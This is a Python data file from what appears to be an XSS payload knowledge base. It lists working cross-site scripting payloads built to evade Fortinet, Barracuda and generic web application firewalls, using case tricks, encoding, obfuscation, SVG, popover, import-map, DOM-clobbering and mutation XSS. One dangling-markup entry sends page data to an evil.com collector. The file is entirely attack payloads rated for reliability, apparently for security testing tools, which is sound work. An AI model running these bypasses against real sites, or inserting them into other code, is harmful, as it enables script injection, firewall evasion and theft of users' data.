#!/usr/bin/env python3
"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-27 UTC
Status: Refactored
Telegram: https://t.me/EasyProTech

Modern Browser Payloads - Part 3
WAF bypasses: Fortinet 2024, Barracuda, and Generic 2024 bypasses.
"""

from ..models import PayloadEntry


MODERN_BROWSER_PAYLOADS_PART3 = {
    # Fortinet 2024
    "fortinet_case": PayloadEntry(
        payload="<ScRiPt>alert(1)</ScRiPt>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.8,
        description="Fortinet bypass via case variation",
        tags=["fortinet", "waf-bypass", "case"],
        bypasses=["fortinet"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    "fortinet_whitespace": PayloadEntry(
        payload="<script\\t>alert(1)</script>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.8,
        description="Fortinet bypass via whitespace",
        tags=["fortinet", "waf-bypass", "whitespace"],
        bypasses=["fortinet"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    "fortinet_slash": PayloadEntry(
        payload="<img/src=x/onerror=alert(1)>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Fortinet bypass via slash separator",
        tags=["fortinet", "waf-bypass", "separator"],
        bypasses=["fortinet"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    "fortinet_protocol": PayloadEntry(
        payload='<a href="jav&#x09;ascript:alert(1)">',
        contexts=["html_content", "url"],
        severity="high",
        cvss_score=7.5,
        description="Fortinet bypass via protocol encoding",
        tags=["fortinet", "waf-bypass", "protocol"],
        bypasses=["fortinet"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    "fortinet_comment": PayloadEntry(
        payload="<script>/**/alert(1)/**/</script>",
        contexts=["html_content", "javascript"],
        severity="critical",
        cvss_score=8.8,
        description="Fortinet bypass via comment injection",
        tags=["fortinet", "waf-bypass", "comment"],
        bypasses=["fortinet"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    # Barracuda
    "barracuda_encoding": PayloadEntry(
        payload="<script>\\x61\\x6c\\x65\\x72\\x74(1)</script>",
        contexts=["html_content", "javascript"],
        severity="critical",
        cvss_score=8.8,
        description="Barracuda bypass via hex encoding",
        tags=["barracuda", "waf-bypass", "encoding"],
        bypasses=["barracuda"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    "barracuda_obfuscation": PayloadEntry(
        payload='<script>window["ale"+"rt"](1)</script>',
        contexts=["html_content", "javascript"],
        severity="critical",
        cvss_score=8.8,
        description="Barracuda bypass via obfuscation",
        tags=["barracuda", "waf-bypass", "obfuscation"],
        bypasses=["barracuda"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    "barracuda_svg_animate": PayloadEntry(
        payload="<svg><animate onbegin=alert(1) attributeName=x>",
        contexts=["html_content", "svg"],
        severity="high",
        cvss_score=7.5,
        description="Barracuda bypass via SVG animate",
        tags=["barracuda", "waf-bypass", "svg"],
        bypasses=["barracuda"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    # Generic 2024 bypasses
    "generic_popover": PayloadEntry(
        payload="<button popovertarget=x>Click</button><div popover id=x onbeforetoggle=alert(1)>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Generic WAF bypass via Popover API",
        tags=["generic", "waf-bypass", "popover", "html5"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "edge"],
        reliability="high",
    ),
    "generic_import_map": PayloadEntry(
        payload='<script type="importmap">{"imports":{"x":"data:text/javascript,alert(1)"}}</script><script type="module">import"x"</script>',
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.8,
        description="Generic WAF bypass via import maps",
        tags=["generic", "waf-bypass", "import-map", "module"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "edge"],
        reliability="high",
    ),
    "generic_dom_clobber": PayloadEntry(
        payload='<form id=x><input id=innerHTML value="<img src=x onerror=alert(1)>"></form>',
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Generic WAF bypass via DOM clobbering",
        tags=["generic", "waf-bypass", "dom-clobbering"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    "generic_mxss": PayloadEntry(
        payload='<noscript><p title="</noscript><script>alert(1)</script>">',
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.8,
        description="Generic WAF bypass via mutation XSS",
        tags=["generic", "waf-bypass", "mxss"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    "generic_dangling": PayloadEntry(
        payload='<img src="https://evil.com/collect?cookie=',
        contexts=["html_content"],
        severity="medium",
        cvss_score=6.1,
        description="Generic WAF bypass via dangling markup",
        tags=["generic", "waf-bypass", "dangling-markup"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="medium",
    ),
}
